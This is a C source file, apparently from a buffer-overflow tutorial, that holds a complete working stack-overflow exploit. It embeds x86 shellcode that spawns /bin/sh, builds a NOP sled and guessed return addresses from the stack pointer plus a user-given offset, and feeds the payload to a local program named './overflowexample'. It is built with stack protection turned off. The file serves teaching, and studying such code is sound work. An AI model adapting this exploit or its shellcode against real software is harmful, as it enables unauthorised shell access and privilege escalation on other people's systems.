// exploit_schaller.c

// by Patrick Schaller (in Tutorial: Buffer Overflows)

//   gcc -fno-stack-protector  -m32 -o exploit_schaller exploit_schaller.c   

#include <stdio.h>
#include <unistd.h>
#define BUF 80
#define NOP 0x90

char shellcode[] =
     "\x31\xc0"
     "\x50"
     "\x68\x2f\x2f\x73\x68"
     "\x68\x2f\x62\x69\x6e"
     "\x89\xe3"
     "\x50"
     "\x53"
     "\x89\xe1"
     "\x89\xc2"
     "\xb0\x0b"
     "\xcd\x80";

long unsigned get_esp()
{
  __asm__("mov %esp, %eax");
}

int main(int argc, char *argv[])
{
  int ret, i, n;
  int *bufptr;
  char *arg[3], buf[BUF];

  if(argc < 2){
    printf("Usage: %s offset\n", argv[0]);
    exit(1);
  }

  /*estimated return address*/
  ret = get_esp() + atoi(argv[1]);

  /*fill buffer with return addresses*/
  bufptr = (int*)buf;
  for(i=0;i<BUF; i +=4)
    *bufptr++ = ret;

  /*fill first part of buf with nops*/
  for(i=0;i < 20 ; i++)
    buf[i]= NOP;

  /*copy shellcode into buf after nops*/
  for(n=0;n<strlen(shellcode);n++)
    buf[i++]=shellcode[n];

  /*set up argv for vulnerable program*/
  arg[0] = "./overflowexample";
  arg[1] = buf;
  arg[2] = NULL;

  /*execute vulnerable program*/
  execve(arg[0], arg, NULL);
  return 0;
}
